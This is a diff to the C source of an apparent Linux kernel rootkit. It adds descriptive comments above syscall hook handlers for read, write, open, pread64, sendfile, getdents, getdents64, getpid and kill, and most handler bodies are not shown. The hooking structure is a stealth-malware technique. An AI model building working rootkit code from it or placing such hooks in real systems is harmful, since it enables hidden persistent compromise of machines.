@@ -51,6 +51,7 @@ static __exit void rootkit_exit(void)
     return;
 }
 
+// sys_read syscall hook handler
 SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __user *, s_buf, size_t,
                       sz_count)
 {
@@ -81,6 +82,7 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
     return l_ret;
 }
 
+// sys_write syscall hook handler
 SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const char __user *, s_buf,
                       size_t, sz_count)
 {
@@ -108,6 +110,7 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
     return orig_write(p_regs);
 }
 
+// sys_open syscall hook handler
 SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                       umode_t, ui16_mode)
 {
@@ -134,6 +137,7 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
     return orig_open(p_regs);
 }
 
+// sys_pread64 syscall hook handler
 SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char __user *, s_buf,
                       size_t, sz_count, loff_t, i64_pos)
 {
@@ -164,6 +168,7 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
     return l_ret;
 }
 
+// sys_sendfile syscall hook handler
 SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32_in_fd,
                       loff_t __user *, p_offset, size_t, sz_count)
 {
@@ -172,6 +177,7 @@ SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32
     return orig_sendfile(p_regs);
 }
 
+// sys_getdents syscall hook handler
 SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd,
                       struct linux_dirent __user *, p_dirent, unsigned int, ui32_count)
 {
@@ -182,6 +188,7 @@ SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd,
     return orig_getdents(p_regs);
 }
 
+// sys_getdents64 syscall hook handler
 SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd,
                       struct linux_dirent64 __user *, p_dirent, unsigned int, ui32_count)
 {
@@ -270,6 +277,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     return l_ret;
 }
 
+// sys_getpid syscall hook handler
 SYSCALL_HOOK_HANDLER0(getpid, orig_getpid, p_regs)
 {
     pr_info("[ROOTKIT] getpid()\n");
@@ -277,6 +285,7 @@ SYSCALL_HOOK_HANDLER0(getpid, orig_getpid, p_regs)
     return orig_getpid(p_regs);
 }
 
+// sys_kill syscall hook handler
 SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
 {
     size_t i;
